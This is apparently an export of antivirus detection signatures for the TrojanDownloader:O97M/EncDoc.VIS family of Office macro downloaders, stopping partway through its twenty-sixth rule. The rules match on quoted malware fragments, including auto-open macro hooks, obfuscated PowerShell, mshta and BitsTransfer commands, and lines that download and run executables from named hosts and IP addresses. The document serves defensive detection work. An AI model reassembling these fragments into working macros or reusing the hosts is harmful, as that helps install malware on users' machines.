
rule TrojanDownloader_O97M_EncDoc_VIS_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {72 65 62 72 61 6e 64 2e 6c 79 2f 57 64 42 50 41 70 6f 4d 41 43 52 4f 27 2c 27 61 2e 62 61 } //1 rebrand.ly/WdBPApoMACRO','a.ba
		$a_01_1 = {70 6f 77 65 72 73 68 44 } //1 powershD
		$a_01_2 = {6c 6b 72 67 6c 6b 6a 67 72 66 6a 6b 6c 6a 67 66 } //1 lkrglkjgrfjkljgf
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {64 54 6f 46 69 6c 65 41 } //1 dToFileA
		$a_01_1 = {2f 35 35 35 35 35 35 35 35 35 35 2e 70 6e 67 } //1 /5555555555.png
		$a_01_2 = {65 78 70 6c 6f 72 65 72 30 } //1 explorer0
		$a_01_3 = {43 3a 5c 44 72 6f 66 74 5c 46 72 6f 74 73 5c 5a 65 72 69 6f 44 68 } //1 C:\Droft\Frots\ZerioDh
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {53 75 62 20 5f } //1 Sub _
		$a_01_1 = {41 75 74 6f 5f 63 6c 6f 73 65 28 29 } //1 Auto_close()
		$a_03_2 = {44 69 6d 20 [0-09] 20 41 73 20 4e 65 77 20 73 65 78 } //1
		$a_03_3 = {53 68 65 6c 6c 20 73 65 78 2e [0-20] 2e [0-20] 2e 54 61 67 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1+(#a_03_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {53 74 61 74 69 63 20 53 75 62 20 61 75 74 6f 5f 6f 70 65 6e 28 29 3a } //1 Static Sub auto_open():
		$a_01_1 = {43 61 6c 63 20 3d 20 5f } //1 Calc = _
		$a_01_2 = {45 72 72 6f 72 2e 54 65 78 74 42 6f 78 31 } //1 Error.TextBox1
		$a_01_3 = {3d 20 53 68 65 6c 6c 28 43 61 6c 63 2c 20 31 29 } //1 = Shell(Calc, 1)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_5{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 "
		
	strings :
		$a_01_0 = {53 75 62 20 5f } //1 Sub _
		$a_01_1 = {41 75 74 6f 5f 63 6c 6f 73 65 28 29 } //1 Auto_close()
		$a_01_2 = {4f 70 74 69 6f 6e 20 45 78 70 6c 69 63 69 74 } //1 Option Explicit
		$a_03_3 = {53 68 65 6c 6c 20 [0-70] 2e 54 61 67 } //1
		$a_01_4 = {55 6e 6c 6f 61 64 20 4d 65 } //1 Unload Me
		$a_01_5 = {54 65 72 6d 69 6e 61 74 65 28 29 } //1 Terminate()
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_03_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=6
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_6{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {72 65 62 72 61 6e 64 2e 6c 79 2f 57 64 42 50 41 70 6f 4d 41 43 52 4f } //1 rebrand.ly/WdBPApoMACRO
		$a_01_1 = {70 6f 77 65 72 73 68 44 } //1 powershD
		$a_01_2 = {68 74 74 70 73 3a 2f 2f 74 68 65 70 68 6f 74 6f 67 72 61 70 68 65 72 73 77 6f 72 6b 66 6c 6f 77 2e 63 6f 6d 2f 76 76 2f 70 6f 70 69 2e 65 78 65 } //1 https://thephotographersworkflow.com/vv/popi.exe
		$a_01_3 = {61 2e 62 61 74 } //1 a.bat
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_7{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 22 74 22 20 2b 20 22 74 22 20 2b 20 22 70 22 20 2b 20 22 3a 22 20 2b 20 22 2f 22 20 2b 20 22 2f 22 20 2b 20 22 77 22 20 2b 20 22 77 22 20 2b 20 22 77 22 20 2b 20 22 2e 6a 2e 6d 70 2f } //1 = "t" + "t" + "p" + ":" + "/" + "/" + "w" + "w" + "w" + ".j.mp/
		$a_01_1 = {3d 20 22 6d 22 20 2b 20 22 73 22 20 2b 20 22 68 22 20 2b 20 22 74 22 20 2b 20 22 61 20 68 } //1 = "m" + "s" + "h" + "t" + "a h
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_8{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {2e 52 75 6e 28 75 4d 35 6c 65 5f 5f 5f 69 5f 43 6d 6f 39 5f 46 6c 35 2c 20 62 37 45 56 6d 51 66 5f 52 43 5f 4d 37 35 5f 46 7a 29 } //1 .Run(uM5le___i_Cmo9_Fl5, b7EVmQf_RC_M75_Fz)
		$a_01_1 = {78 63 76 62 5f 20 3d 20 43 68 72 28 73 64 5f 20 2d 20 36 32 29 } //1 xcvb_ = Chr(sd_ - 62)
		$a_01_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 70 63 5f 5f 5f 71 5f 5a 5f 63 6f 72 7a } //1 CreateObject(pc___q_Z_corz
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_9{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {68 74 74 70 73 3a 2f 2f 31 32 33 30 39 34 38 25 31 32 33 30 39 34 38 40 62 69 74 6c 79 2e 63 6f 6d 2f 61 73 64 64 61 73 6a 69 73 64 75 61 69 73 6b 64 68 69 6b 68 61 73 64 } //1 https://1230948%1230948@bitly.com/asddasjisduaiskdhikhasd
		$a_01_1 = {52 75 6e 20 6c 6f 72 61 32 } //1 Run lora2
		$a_01_2 = {6d 73 68 74 61 } //1 mshta
		$a_01_3 = {53 75 62 20 61 75 74 6f 5f 6f 70 65 6e 28 29 } //1 Sub auto_open()
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_10{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {2e 52 75 6e 28 58 41 37 36 39 4f 6e 4a 49 72 5f 37 71 75 2c 20 63 51 5f 4c 4c 50 5f 6c 32 79 56 48 65 62 5f 76 29 } //1 .Run(XA769OnJIr_7qu, cQ_LLP_l2yVHeb_v)
		$a_01_1 = {78 63 76 62 5f 20 3d 20 43 68 72 28 73 64 5f 20 2d 20 36 32 29 } //1 xcvb_ = Chr(sd_ - 62)
		$a_01_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 4b 4c 5f 46 5a 69 6c 50 4b 70 53 53 49 5f 5f 4b 66 5f 4b 67 29 } //1 CreateObject(KL_FZilPKpSSI__Kf_Kg)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_11{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {53 75 62 20 5f } //1 Sub _
		$a_01_1 = {41 75 74 6f 5f 63 6c 6f 73 65 28 29 } //1 Auto_close()
		$a_01_2 = {4f 70 74 69 6f 6e 20 45 78 70 6c 69 63 69 74 } //1 Option Explicit
		$a_01_3 = {53 68 65 6c 6c 20 55 73 65 72 46 6f 72 6d 32 2e 43 6c 6f 73 65 54 68 65 57 69 6e 64 6f 77 2e 54 61 67 } //1 Shell UserForm2.CloseTheWindow.Tag
		$a_01_4 = {55 6e 6c 6f 61 64 20 4d 65 20 27 55 73 65 72 46 6f 72 6d 31 } //1 Unload Me 'UserForm1
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_12{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {55 52 4c 44 6f 77 6e 6c 22 26 43 48 41 52 28 31 31 31 29 26 22 61 64 54 6f 46 69 6c 65 41 } //1 URLDownl"&CHAR(111)&"adToFileA
		$a_01_1 = {74 74 70 3a 2f 2f 31 38 38 2e 31 32 37 2e 32 35 34 2e 36 31 2f 38 39 37 38 36 34 35 34 36 35 37 36 34 35 2e 65 78 65 } //1 ttp://188.127.254.61/89786454657645.exe
		$a_01_2 = {45 58 45 43 28 22 43 3a 5c 50 52 4f 47 52 41 4d 44 41 54 41 5c 61 2e 65 78 65 } //1 EXEC("C:\PROGRAMDATA\a.exe
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_13{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {62 79 70 61 73 73 20 73 74 41 52 74 } //1 bypass stARt
		$a_03_1 = {2e 28 27 2e 27 2b 27 2f [0-ff] 22 26 43 48 41 52 28 34 36 29 26 22 65 78 65 27 29 } //1
		$a_01_2 = {74 74 70 73 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 79 32 75 61 36 64 61 68 } //1 ttps://tinyurl.com/y2ua6dah
		$a_01_3 = {63 64 20 24 7b 65 6e 56 60 3a 61 70 70 64 61 74 61 7d } //1 cd ${enV`:appdata}
		$a_01_4 = {28 27 44 6f 77 6e 27 2b 27 6c 6f 61 64 46 69 6c 65 27 29 } //1 ('Down'+'loadFile')
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_14{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {77 77 71 73 73 2e 52 75 6e 20 28 78 73 73 71 77 65 28 } //1 wwqss.Run (xssqwe(
		$a_03_1 = {53 68 65 6c 6c 20 28 45 6e 76 69 72 6f 6e 28 22 54 65 6d 70 22 29 20 2b 20 22 5c [0-0a] 2e 62 61 74 22 29 } //1
		$a_01_2 = {73 53 74 72 20 3d 20 73 53 74 72 20 2b 20 43 68 72 28 43 4c 6e 67 28 22 26 48 22 20 26 20 4d 69 64 28 73 74 72 2c 20 69 2c 20 32 29 29 20 2d 20 39 29 } //1 sStr = sStr + Chr(CLng("&H" & Mid(str, i, 2)) - 9)
		$a_01_3 = {78 73 73 71 77 65 20 3d 20 73 53 74 72 } //1 xssqwe = sStr
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_15{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {25 74 6d 70 25 5c 5c 41 52 44 41 34 50 4c 2e 6a 61 72 } //1 %tmp%\\ARDA4PL.jar
		$a_01_1 = {44 6f 77 6e 6c 6f 61 64 46 69 6c 65 } //1 DownloadFile
		$a_01_2 = {68 74 74 70 73 3a 2f 2f 72 61 77 2e 67 69 74 68 75 62 75 73 65 72 63 6f 6e 74 65 6e 74 2e 63 6f 6d 2f 61 79 62 69 6f 74 61 2f 6d 70 62 68 33 33 37 37 35 2f 67 68 2d 70 61 67 65 73 2f 67 39 77 6c 35 64 70 2e 74 74 66 5c } //1 https://raw.githubusercontent.com/aybiota/mpbh33775/gh-pages/g9wl5dp.ttf\
		$a_01_3 = {70 6f 77 65 72 73 68 65 6c 6c 20 2d 63 6f 6d 6d 61 6e 64 } //1 powershell -command
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_16{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {2e 52 75 6e } //1 .Run
		$a_01_1 = {70 3a 2f 2f 31 37 38 2e 31 37 2e 31 37 34 2e 33 38 2f 66 31 2f 43 6f 6e 73 6f 6c 65 41 70 70 31 31 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 33 34 29 20 26 20 22 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e } //1 p://178.17.174.38/f1/ConsoleApp11.ex" & Chr(101) & Chr(34) & " -Destination
		$a_03_2 = {26 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-0a] 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_17{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 73 3a 2f 2f 7a 78 63 2e 61 6d 69 72 61 6c 72 6f 75 74 65 72 2e 6f 6e 6c 69 6e 65 2f 74 65 73 74 78 78 78 78 2e 65 78 65 22 } //1 Open "GET", "https://zxc.amiralrouter.online/testxxxx.exe"
		$a_01_1 = {47 65 74 53 70 65 63 69 61 6c 46 6f 6c 64 65 72 28 32 29 20 2b 20 22 2f 73 65 72 76 65 2e 65 78 65 22 } //1 GetSpecialFolder(2) + "/serve.exe"
		$a_01_2 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 54 65 6d 70 46 69 6c 65 2c 20 32 } //1 .savetofile TempFile, 2
		$a_01_3 = {6f 62 6a 53 68 65 6c 6c 2e 52 75 6e 20 28 54 65 6d 70 46 69 6c 65 29 } //1 objShell.Run (TempFile)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_18{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 "
		
	strings :
		$a_03_0 = {65 78 70 6c 6f 72 65 72 2e 65 78 65 20 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-20] 2e 68 74 61 22 } //1
		$a_03_1 = {27 27 29 2e 72 65 76 65 72 73 65 28 29 2e 6a 6f 69 6e 28 27 27 29 3b 7d [0-20] 20 3d 20 77 69 6e 64 } //1
		$a_01_2 = {4f 70 74 69 6f 6e 20 45 78 70 6c 69 63 69 74 } //1 Option Explicit
		$a_03_3 = {53 70 6c 69 74 28 70 28 66 72 6d 2e [0-0a] 29 2c 20 22 20 22 29 } //1
		$a_01_4 = {20 3d 20 52 65 70 6c 61 63 65 28 } //1  = Replace(
		$a_01_5 = {2e 65 78 65 63 20 70 28 } //1 .exec p(
	condition:
		((#a_03_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1+(#a_03_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=6
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_19{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,0b 00 0b 00 0b 00 00 "
		
	strings :
		$a_01_0 = {47 65 74 4f 62 6a 65 63 74 28 22 22 20 2b 20 22 6e 22 20 2b 20 22 65 22 20 2b 20 22 77 22 20 2b 20 22 3a 22 20 2b 20 22 46 22 20 2b 20 22 39 22 20 2b } //1 GetObject("" + "n" + "e" + "w" + ":" + "F" + "9" +
		$a_01_1 = {3d 20 22 4d 22 } //1 = "M"
		$a_01_2 = {3d 20 22 73 22 } //1 = "s"
		$a_01_3 = {3d 20 22 48 22 } //1 = "H"
		$a_01_4 = {3d 20 22 54 22 } //1 = "T"
		$a_01_5 = {3d 20 22 61 22 } //1 = "a"
		$a_01_6 = {3d 20 22 6d 70 2f 22 } //1 = "mp/"
		$a_01_7 = {3d 20 22 70 22 } //1 = "p"
		$a_01_8 = {3d 20 22 6a 2e 22 } //1 = "j."
		$a_01_9 = {3d 20 22 3a 2f 2f 22 } //1 = "://"
		$a_01_10 = {6b 6f 6e 68 61 69 79 65 68 6c 6f 67 2e 45 58 45 43 } //1 konhaiyehlog.EXEC
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1+(#a_01_7  & 1)*1+(#a_01_8  & 1)*1+(#a_01_9  & 1)*1+(#a_01_10  & 1)*1) >=11
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_20{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {44 6c 6c 49 6e 73 74 61 6c 6c 20 46 61 6c 73 65 2c 20 42 79 56 61 6c 20 53 74 72 50 74 72 28 22 68 74 74 70 3a 2f 2f 31 39 32 2e 32 33 36 2e 31 34 37 2e 31 38 39 2f 65 78 65 63 75 74 65 2f 75 70 6c 6f 61 64 73 2f 45 78 63 65 6c 2e 73 63 74 22 29 20 27 20 46 61 6c 73 65 20 3d 20 22 44 6f 6e 27 74 20 69 6e 73 74 61 6c 6c } //1 DllInstall False, ByVal StrPtr("http://192.236.147.189/execute/uploads/Excel.sct") ' False = "Don't install
		$a_01_1 = {53 75 62 20 41 75 74 6f 5f 4f 70 65 6e 28 29 } //1 Sub Auto_Open()
		$a_01_2 = {75 6e 63 74 69 6f 6e 20 44 6c 6c 49 6e 73 74 61 6c 6c 20 4c 69 62 20 22 73 63 72 6f 62 6a 2e 64 6c 6c } //1 unction DllInstall Lib "scrobj.dll
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_21{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 54 65 73 74 2e 64 6c 6c } //1 C:\ProgramData\Test.dll
		$a_01_1 = {44 65 63 6f 64 65 36 34 28 49 50 4a 5f 53 74 61 74 75 73 5f 57 53 44 56 41 28 29 29 } //1 Decode64(IPJ_Status_WSDVA())
		$a_01_2 = {43 72 65 61 74 65 20 22 72 65 67 73 76 72 33 32 20 2f 73 20 22 20 2b 20 47 65 74 54 65 6d 70 50 61 74 68 28 29 2c 20 4e 75 6c 6c 2c 20 6f 62 6a 43 6f 6e 66 69 67 2c 20 69 6e 74 50 72 6f 63 65 73 73 49 44 } //1 Create "regsvr32 /s " + GetTempPath(), Null, objConfig, intProcessID
		$a_01_3 = {6f 62 6a 57 4d 49 53 65 72 76 69 63 65 2e 47 65 74 28 22 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 53 74 61 72 74 75 70 22 29 } //1 objWMIService.Get("Win32_ProcessStartup")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_22{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {68 65 6c 6c 20 2d 77 20 48 20 53 74 61 72 74 2d 42 69 74 73 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 68 74 74 70 3a 2f 2f 34 35 2e 38 35 2e 39 30 2e 31 34 2f 69 38 38 2f 4b 70 62 65 68 6d 75 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 33 34 29 } //1 hell -w H Start-BitsTransfer -Source " & Chr(34) & "http://45.85.90.14/i88/Kpbehmu.ex" & Chr(101) & Chr(34)
		$a_03_1 = {2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-22] 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 33 34 29 20 26 } //1
		$a_01_2 = {2e 65 78 65 63 28 } //1 .exec(
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_23{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {3d 20 22 6d 22 20 2b 20 22 73 22 20 2b 20 22 68 22 20 2b 20 22 74 22 20 2b 20 22 61 22 } //1 = "m" + "s" + "h" + "t" + "a"
		$a_01_1 = {3d 20 22 68 22 20 2b 20 22 74 22 20 2b 20 22 74 22 20 2b 20 22 70 22 20 2b 20 22 3a 22 20 2b 20 22 2f 22 20 2b 20 22 2f 22 20 2b 20 22 77 22 20 2b 20 22 77 22 20 2b 20 22 77 22 20 2b 20 22 2e 22 20 2b 20 22 6a 22 20 2b 20 22 2e 22 20 2b 20 22 6d 22 20 2b 20 22 70 22 20 2b 20 22 2f 22 20 2b 20 22 } //1 = "h" + "t" + "t" + "p" + ":" + "/" + "/" + "w" + "w" + "w" + "." + "j" + "." + "m" + "p" + "/" + "
		$a_01_2 = {43 61 6c 6c 20 53 68 65 6c 6c 45 78 65 63 75 74 65 28 30 26 2c 20 76 62 4e 75 6c 6c 53 74 72 69 6e 67 2c 20 46 69 6c 65 4e 61 6d 65 2c 20 5f } //1 Call ShellExecute(0&, vbNullString, FileName, _
		$a_01_3 = {46 69 6c 65 4e 6f 6d 65 2c 20 76 62 4e 75 6c 6c 53 74 72 69 6e 67 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73 29 } //1 FileNome, vbNullString, vbNormalFocus)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_24{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {64 73 61 66 6a 69 6f 73 64 6a 20 3d 20 22 64 66 73 67 20 20 62 76 78 63 6e 67 66 20 20 76 78 63 78 76 63 20 67 66 64 73 67 20 76 78 63 62 76 63 78 22 } //1 dsafjiosdj = "dfsg  bvxcngf  vxcxvc gfdsg vxcbvcx"
		$a_01_1 = {78 63 76 62 5f 28 31 32 39 29 20 26 20 78 63 76 62 5f 28 31 33 39 29 20 26 20 78 63 76 62 5f 28 31 36 32 29 20 26 20 78 63 76 62 5f 28 39 34 29 20 26 20 78 63 76 62 5f 28 31 30 39 29 20 26 20 78 63 76 62 5f 28 31 36 31 29 20 26 20 78 63 76 62 5f 28 39 34 29 20 26 20 78 63 76 62 5f 28 31 37 38 29 20 26 20 78 63 76 62 5f 28 31 36 37 29 20 26 20 78 63 76 62 5f 28 31 37 31 29 20 26 20 78 63 76 62 5f 28 31 36 33 29 20 26 20 78 63 76 62 5f 28 31 37 33 29 20 26 20 78 63 76 62 5f 28 31 37 39 29 20 26 20 78 63 76 62 5f 28 31 37 38 29 } //1 xcvb_(129) & xcvb_(139) & xcvb_(162) & xcvb_(94) & xcvb_(109) & xcvb_(161) & xcvb_(94) & xcvb_(178) & xcvb_(167) & xcvb_(171) & xcvb_(163) & xcvb_(173) & xcvb_(179) & xcvb_(178)
		$a_01_2 = {66 67 73 64 66 67 62 20 3d 20 34 35 } //1 fgsdfgb = 45
		$a_01_3 = {2e 52 75 6e 28 } //1 .Run(
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_25{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 } //1 Private Sub Document_Open()
		$a_01_1 = {2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 22 20 26 20 73 68 65 20 26 20 22 6c 22 29 } //1 .CreateObject("wscript." & she & "l")
		$a_01_2 = {2e 65 78 65 63 28 70 73 6f 77 65 72 73 73 20 26 20 22 68 65 6c 6c 20 2d 77 20 22 20 26 20 73 65 61 73 65 20 26 20 22 6e 20 49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 55 72 69 20 22 20 26 20 43 68 72 28 33 34 29 } //1 .exec(psowerss & "hell -w " & sease & "n Invoke-WebRequest -Uri " & Chr(34)
		$a_03_3 = {68 74 74 70 3a 2f 2f [0-72] 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 33 34 29 20 26 20 22 20 2d 4f 75 74 46 22 20 26 20 22 69 6c 65 20 22 20 26 20 43 68 72 28 33 34 29 } //1
		$a_03_4 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-0f] 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 33 34 29 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_03_3  & 1)*1+(#a_03_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_EncDoc_VIS_MTB_26{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {49 63 48 59 6a 4b 46 5a 20 3d 20 6b 72 45 4c 76 44 74 20 2b 20 6d 4c 79 73 71 79 61 4e 20 2b 20 22 20 22 20 2b 20 47 42 67 73 74 47 6b } //1 IcHYjKFZ = krELvDt + mLysqyaN + " " + GBgstGk
